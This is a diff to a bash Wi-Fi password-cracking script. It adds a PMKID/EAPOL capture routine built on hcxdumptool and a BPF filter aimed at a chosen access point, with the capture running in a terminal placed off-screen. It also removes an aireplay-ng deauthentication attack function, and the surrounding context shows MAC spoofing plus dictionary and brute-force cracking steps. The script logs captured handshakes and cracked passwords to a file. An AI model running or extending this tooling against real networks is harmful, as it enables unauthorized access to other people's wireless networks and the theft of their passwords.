@@ -1,10 +1,10 @@
 #!/bin/bash
 
-# version: 3.5.5 26/5/25 11:55
+# version: 3.6 27/5/25 02:30
 
 
 ### Changlog ###
-	# Bug fixes.
+	# Added PMKID attack.
 
 
 ### FIX ###
@@ -16,15 +16,10 @@
 	# run all networks or range of them at the same time.
 	# add more dictioneries than rockyou? or change the default from rockyou - LOOK for better WIFI wordlist
 	# specific passwords lists for different vendors
-	# functions to crack PMKID (using hcxpcapngtool..)
 	# default vendors length (for example: ZTE - 8 capital and numbers) with hashcat
 	# find attacks for WPA3
 	# Add clients untill we choose network.
 	# Show WPS routers - and add Pixydust attack.
-
-
-
-
 
 
 
@@ -173,7 +168,7 @@ function adapter_config() {
 		wifi_adapter="${mon_adapter%mon}"
 	else
 		echo -e "\e[31mFailed to start monitor mode. Check your adapter and try again.\e[0m"
-		return 1
+		exit 1
 	fi
 }
 
@@ -305,7 +300,6 @@ function network_scanner() {
 	    fi
 
 
-
 	    # Use printf to format the fields and pipe into column for proper alignment
 	    if [[ -n "$vendor" ]]; then
 		printf "%-4s %-35s | %-7s | %-10b | %-7s | %-5s | %-5b | %-17s | %-1s\n" \
@@ -428,6 +422,7 @@ function choose_network() {
         fi
 
         validate_network
+        
         break  # Exit the loop once a valid network is chosen
     done
 }
@@ -448,7 +443,7 @@ function validate_network() {
     for (( i=0; i<20; i++ )); do
         if [ "$(grep -c "$bssid_address" "$targets_path/$bssid_name/airodump_output.txt")" -ge 2 ]; then
             found=1
-            echo -e "\n\e[1;32mNetwork available!\e[0m"
+            echo -e "\n\e[1;32mNetwork available!\e[0m\n"
             break
         fi
         echo -n "."  # Show progress dots
@@ -486,22 +481,28 @@ function get_oui_vendor() {
 }
 
 
+
 # ------------------------------
 # Dvices Scanner
 # ------------------------------
 function devices_scanner() {
-    echo -e "\e[1m\nStart scanning for devices ->>\e[0m"
-
-    duration=60  # Set countdown time (seconds)
-    
-    while [ $duration -gt 0 ]; do
+    seen_macs=()
+    devices_header_shown=false
+    while true; do
         target_devices=$(grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$targets_path/$bssid_name/$bssid_name-01.kismet.netxml")
 
         if [ -n "$target_devices" ]; then
-            # Print Devices_Found with vendor names
-            echo -e "\n\n\033[1;33mDevices Found:\033[0m" 
-            echo -e "$target_devices" | tr ' ' '\n' | while read -r mac; do
-                if [[ -n "$mac" ]]; then
+            while IFS= read -r mac; do
+                if [[ -n "$mac" && ! " ${seen_macs[*]} " =~ " $mac " ]]; then
+                    seen_macs+=("$mac")
+
+                    # Print the "Devices Found" header once
+                    if [ "$devices_header_shown" = false ]; then
+                        echo -e "\n\033[1;34mDevices Found:\033[0m"
+                        devices_header_shown=true
+                    fi
+
+                    # Print new device
                     vendor=$(get_oui_vendor "$mac")
                     if [[ -n "$vendor" ]]; then
                         echo -e "$mac - $vendor"
@@ -509,43 +510,100 @@ function devices_scanner() {
                         echo -e "$mac"
                     fi
                 fi
-            done		
-            echo
-            break
+            done <<< "$(echo "$target_devices" | tr ' ' '\n')"
         fi
-
-        # Convert remaining seconds into MM:SS format
-        minutes=$((duration / 60))
-        seconds=$((duration % 60))
-        printf "\r\e[1;34m%02d:%02d\e[0m Scanning for devices.." "$minutes" "$seconds"
-
-        # Check if handshake is found
-        if grep -q "EAPOL" "$targets_path/$bssid_name/airodump_output.txt"; then
-            echo -e "\033[1;32m\n->> Got the EAPOL handshake!\033[0m\n"
-            pkill aireplay-ng
-            pkill airodump-ng
-            echo
-            echo --- >> "$targets_path/wifi_passwords.txt"
-            printf "We got handshake for (%s): %-40s at %s\n" "$bssid_address" "$bssid_name" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
-            cleanup
-            choose_attack
-        fi
-
         sleep 1
-        ((duration--))
+    done
+}
+
+
+
+# ------------------------------------------
+# Capture PMKID/EAPOL 
+# ------------------------------------------
+function capture_handshake() {
+    pcapng_file="$targets_path/$bssid_name/hcxdump.pcapng"
+    hash_file="$targets_path/$bssid_name/hash.hc22000"
+
+    # Create BPF filter
+    hcxdumptool --bpfc="wlan addr3 $bssid_address" > "$targets_path/$bssid_name/filter.bpf"
+
+    # Determine the band suffix based on channel number
+    if [[ "$channel" -ge 1 && "$channel" -le 14 ]]; then
+        band="a"
+    elif [[ "$channel" -ge 36 && "$channel" -le 165 ]]; then
+        band="b"
+    elif [[ "$channel" -ge 191 && "$channel" -le 233 ]]; then
+        band="c"
+    elif [[ "$channel" -ge 1 && "$channel" -le 9 ]]; then
+        band="e"
+    else
+        band=""
+    fi
+
+    echo -e "\033[1;31m\033[1mStarting PMKID attack ->>\033[0m"
+
+    # Start device scanner in background
+    devices_scanner &
+    scanner_pid=$!
+
+    # Start hcxdumptool in hidden terminal
+    if [[ -n "$band" ]]; then
+        channel_with_band="${channel}${band}"
+        gnome-terminal --geometry=95x30-10000-10000 -- bash -c "hcxdumptool -i '${wifi_adapter}mon' -c '$channel_with_band' -w '$pcapng_file' -F --bpf='${targets_path}/${bssid_name}/filter.bpf' --rds=1" &
+    else
+        echo "Warning: Unknown channel ($channel), running without -c"
+        gnome-terminal --geometry=95x30-10000-10000 -- bash -c "hcxdumptool -i '${wifi_adapter}mon' -w '$pcapng_file' -F --bpf='${targets_path}/${bssid_name}/filter.bpf' --rds=1" &
+    fi
+
+    sleep 2
+    terminal_pid=$(pgrep gnome-terminal)
+
+    counter=0
+    max_tries=24  # 24 * 5s = 120 seconds
+
+    while (( counter < max_tries )); do
+        hcxpcapngtool -o "$hash_file" "$pcapng_file" &>/dev/null
+
+        if [[ -s "$hash_file" ]]; then
+            #pmkid_count=$(grep -c '^WPA\*01\*' "$hash_file")
+            #eapol_count=$(grep -c '^WPA\*02\*' "$hash_file")
+            
+            sta_mac=$(grep -m1 '^WPA\*0[12]\*' "$hash_file" | cut -d'*' -f5 | sed 's/../&:/g; s/:$//' | tr 'a-f' 'A-F')
+            sleep 3
+
+            if grep -q '^WPA\*01\*' "$hash_file"; then
+                #echo -e "\n\033[1;32m->> Got the PMKID!\033[0m\n"
+		echo -e "\n\033[1;32m->> Got the PMKID!  \033[0m($sta_mac)\n"
+                break
+            elif grep -q '^WPA\*02\*' "$hash_file"; then
+                echo -e "\n\033[1;32m->> Got the EAPOL handshake!  \033[0m($sta_mac)\n"
+                break
+            fi
+        fi
+
+        sleep 5
+        ((counter++))
     done
 
-    # Clear the countdown timer after scanning finishes
-    echo -ne "\r                                      \r"
+    # Kill scanner and hcxdumptool terminal
+    kill "$scanner_pid" &>/dev/null
+    kill "$terminal_pid" &>/dev/null
+    pkill aireplay-ng
+    pkill airodump-ng
 
-    if [ -z "$target_devices" ]; then
-        echo -e "\033[1;31m\033[1mNo device were found.\033[0m\n\n"
-        pkill airodump-ng
-        rm -r "$targets_path/$bssid_name"
+
+    if (( counter == max_tries )); then
+        echo "Timeout: No PMKID or EAPOL captured in 120 seconds."
         another_scan_prompt
+        return
     fi
-    sleep 2
+
+    echo --- >> "$targets_path/wifi_passwords.txt"
+    printf "We got handshake for (%s): %-40s at %s\n" "$bssid_address" "$bssid_name" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
 }
+
+
 
 
 
@@ -558,58 +616,6 @@ function mixed_encryption() {
     sleep 5
 }
 
-
-
-# ------------------------------
-# Deauth Attack  
-# ------------------------------
-function deauth_attack() {
-	    echo -e "\033[1;31m\033[1mStarting deauth attack ->>\033[0m"
-	    # trying 10 times (1.5 minutes) the deauth attack
-	    counter=10
-	    for ((i=1; i<=$counter; i++)); do        
-		target_devices=$(grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$targets_path/$bssid_name/$bssid_name-01.kismet.netxml")		
-
-		gnome-terminal --geometry=78x4-10000-10000 -- timeout 5s aireplay-ng --deauth 1000 -a "$bssid_address" "$wifi_adapter"mon
-		
-		echo -e "Attempt \e[1;34m$i/$counter\e[0m to capture handshake of:"         			
-		# Print MAC addresses with vendor names
-		echo -e "$target_devices" | tr ' ' '\n' | while read -r mac; do
-		    if [[ -n "$mac" ]]; then
-			# Call the function to get the vendor
-			vendor=$(get_oui_vendor "$mac")
-			# Print the MAC with its vendor
-			if [[ -n "$vendor" ]]; then
-			    echo "$mac - $vendor"
-			else
-			    echo "$mac"
-			fi
-		    fi
-		done	
-		echo
-		# waiting 9 sec after deauth attack while looking for handshake:
-		for ((j=1; j<=9; j++)); do
-		    sleep 1
-		    if grep -q "EAPOL" "$targets_path/$bssid_name/airodump_output.txt"; then
-		        echo -e "\033[1;32m->> Got the EAPOL handshake!\033[0m\n"
-		        pkill aireplay-ng
-			pkill airodump-ng
-			echo
-			echo --- >> $targets_path/wifi_passwords.txt
-			printf "We got handshake for (%s): %-40s at %s\n" "$bssid_address" "$bssid_name" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
-			break 2
-		    fi    
-		done
-	    # after 10 unseccessfull attempts, quit the script:
-	    if [ "$i" == "$counter" ]; then
-	    	echo -e "\n\033[1;31m\033[1mNo handshake obtained.\033[0m \033[1mTry again.\033[0m"
-	    	pkill aireplay-ng
-		pkill airodump-ng
-		rm -r $targets_path/"$bssid_name"
-		another_scan_prompt
-	    fi
-	    done       
-}
 
 
 # -------------------------
@@ -627,10 +633,7 @@ function crack_wep() {
     touch "$output_file"
 
     echo -e "\n\033[1;33mStarting WEP Cracking:\033[0m"
-    #echo -e "A new window will open for \033[1;32mairodump-ng\033[0m."
     echo -e "Monitor the \033[1;36m#Data\033[0m column in the \033[1;32maircrack-ng\033[0m window. You typically need 30K-50K IVs."
-    #echo -e "Other windows for attacks (deauth, fake auth, ARP replay) will also appear.\n"
-    #echo -e "[*] Starting packet capture (airodump-ng)..."
     
     # Start airodump-ng in a new terminal and get the terminal's PID
     # The 'exec bash' at the end of commands run in gnome-terminal keeps the terminal open after the command finishes, useful for inspection.
@@ -785,9 +788,10 @@ echo -e "\n\e[1mCracking Wi-Fi password using:\e[0m $dict_file \e[1m->>\e[0m\n"
         echo -e "\033[1;34mThe Wi-Fi password of\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m\t\033[1;33m$wifi_pass\033[0m"
         bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
         
-        #sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ { s/\nPassword not cracked with selected wordlist// } }" "$targets_path/wifi_passwords.txt"
-        
-        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ d; }" "$targets_path/wifi_passwords.txt"
+        #sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ { s/\nPassword not cracked with// } }" "$targets_path/wifi_passwords.txt"
+        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with.*/ { s/\nPassword not cracked with.*// } }" "$targets_path/wifi_passwords.txt"
+
+        #sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ d; }" "$targets_path/wifi_passwords.txt"
 
         
         
@@ -962,9 +966,10 @@ function brute-force_attack() {
         echo -e "\033[1;34mThe wifi password of\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m	\033[1;33m$wifi_pass\033[0m"
         bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
         
-        
-        #sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ { s/\nPassword not cracked with selected wordlist// } }" "$targets_path/wifi_passwords.txt"
-        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ d; }" "$targets_path/wifi_passwords.txt"
+        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with.*/ { s/\nPassword not cracked with.*// } }" "$targets_path/wifi_passwords.txt"
+
+        #sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ { s/\nPassword not cracked with// } }" "$targets_path/wifi_passwords.txt"
+        #sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ d; }" "$targets_path/wifi_passwords.txt"
         
         sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The Wi-Fi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
         rm -r $targets_path/"$bssid_name" 
@@ -1053,37 +1058,27 @@ function enable_gpu() {
 
 
 # ------------------------------
-# Retry Prompt
+# Another Scan Prompt
 # ------------------------------
 function another_scan_prompt() {
     while true; do
         echo
         echo -e "\e[1mWhat would you like to do next ?\e[0m"
         echo "1. Choose different network to attack"
-        echo "2. Run new Scan"
+        echo "2. Run a new Scan"
         echo "3. Exit"
         read -p "Enter your choice (1-3): " choice
         echo
         case $choice in
             1)
                 choose_network
-                devices_scanner
 	
 		if [[ "$encryption" == "WPA3 WPA2" ]]; then            
 		    mixed_encryption
 		fi    
 
-		deauth_attack
-		cleanup
-		
-		hcxpcapngtool -o "$targets_path/$bssid_name/hash.hc22000" "$targets_path/$bssid_name/$bssid_name-01.cap" > /dev/null 2>&1
-		if [ ! -f "$targets_path/$bssid_name/hash.hc22000" ]; then
-		    echo '❌ Failed to create hash.hc22000 for hashcat.';
-		    echo 'Check if you captured the EAPOL handshake or PMKID.';
-		    echo -e 'Look at the airodump_output.txt file for details. \nExiting.\n\n';
-		    exit 1	       
-		fi	
-		
+		capture_handshake
+		cleanup	
 		choose_attack
                 break
                 ;;
@@ -1120,7 +1115,7 @@ function cleanup() {
 # ------------------------------
 function choose_attack() {
 	while true; do
-	    echo -e "\n\033[1;33mChoose how to crack the password:\e[0m"
+	    echo -e "\n\n\033[1;33mChoose how to Crack the Password:\e[0m"
 	    echo "1) Dictionary attack"
 	    echo "2) Brute-Force attack"
 	    read -p "Enter your choice: " choice
@@ -1149,23 +1144,13 @@ function main_process() {
 	adapter_config
 	spoof_adapter_mac
 	network_scanner
-	devices_scanner
-	
+
 	if [[ "$encryption" == "WPA3 WPA2" ]]; then            
             mixed_encryption
         fi    
-
-	deauth_attack
-	cleanup
-	
-	hcxpcapngtool -o "$targets_path/$bssid_name/hash.hc22000" "$targets_path/$bssid_name/$bssid_name-01.cap" > /dev/null 2>&1
-	if [ ! -f "$targets_path/$bssid_name/hash.hc22000" ]; then
-	    echo '❌ Failed to create hash.hc22000 for hashcat.';
-	    echo 'Check if you captured the EAPOL handshake or PMKID.';
-	    echo -e 'Look at the airodump_output.txt file for details. \nExiting.\n\n';
-	    exit 1	       
-	fi	
-	
+        
+        capture_handshake
+	cleanup	
 	choose_attack
 }
 
